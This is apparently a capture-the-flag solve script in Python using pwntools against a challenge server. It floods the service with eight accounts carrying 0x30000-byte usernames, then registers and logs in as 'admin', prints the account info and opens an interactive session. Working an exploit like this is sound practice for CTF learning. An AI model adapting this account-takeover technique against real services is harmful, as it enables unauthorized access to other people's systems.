from pwn import *

p = remote("ctf2021.hackpack.club", 10994)


def auth(user,pwd):
	p.sendline("2")
	p.sendline(user)
	p.sendline(pwd)
	return

def newAcc(usr,pwd):
	p.sendline("3")
	p.sendline(usr)
	p.sendline(pwd)
	return

def info():
	p.sendline("4")	

for i in range(8):
	newAcc("A"*0x30000 + str(i),"B")

newAcc("admin","1")
auth("admin","1")
print(info())

p.interactive()